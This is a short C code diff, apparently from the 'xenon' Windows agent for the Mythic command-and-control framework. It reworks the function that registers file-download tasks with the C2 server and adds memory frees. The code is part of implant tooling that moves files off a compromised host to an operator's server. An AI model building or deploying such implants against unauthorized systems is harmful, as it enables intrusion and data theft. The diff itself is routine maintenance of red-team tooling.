@@ -52,13 +52,20 @@ DWORD DownloadInit(_In_ PCHAR taskUuid, _Inout_ PFILE_DOWNLOAD File)
 /**
  * @brief Update Mythic File UUID for Download Task 
  */
-BOOL DownloadSync(PCHAR TaskUuid, PCHAR FileUuid)
+BOOL DownloadSync(_In_ PCHAR TaskUuid, _In_ PPARSER Response)
 {
-    PFILE_DOWNLOAD List = xenonConfig->DownloadQueue;
+    PCHAR  FileUuid = NULL;
+    SIZE_T fidLen   = 0;
 
-    if ( !TaskUuid || !FileUuid ) {
+    if ( !TaskUuid || Response == NULL ) {
         return FALSE;
     }
+
+    UINT32 Status = ParserGetInt32(Response);       // TODO not totally sure where this is coming from
+
+    FileUuid = ParserStringCopy(Response, &fidLen);
+
+    PFILE_DOWNLOAD List = xenonConfig->DownloadQueue;
 
     /* Find Task This Belongs To */
     while ( List )
@@ -74,6 +81,10 @@ BOOL DownloadSync(PCHAR TaskUuid, PCHAR FileUuid)
 
                 List->Initialized = TRUE;
             }
+            else
+            {
+                LocalFree(FileUuid);
+            }
             
             return TRUE;
         }
@@ -81,6 +92,7 @@ BOOL DownloadSync(PCHAR TaskUuid, PCHAR FileUuid)
         List = List->Next;
     }
 
+    LocalFree(FileUuid);
     return TRUE;
 }
 
@@ -188,6 +200,8 @@ CLEANUP:
 
 /**
  * @brief Add any chunks for file downloads to packet
+ * 
+ * TODO - Currently queues all chunks at once, improve
  */
 VOID DownloadPush()
 {
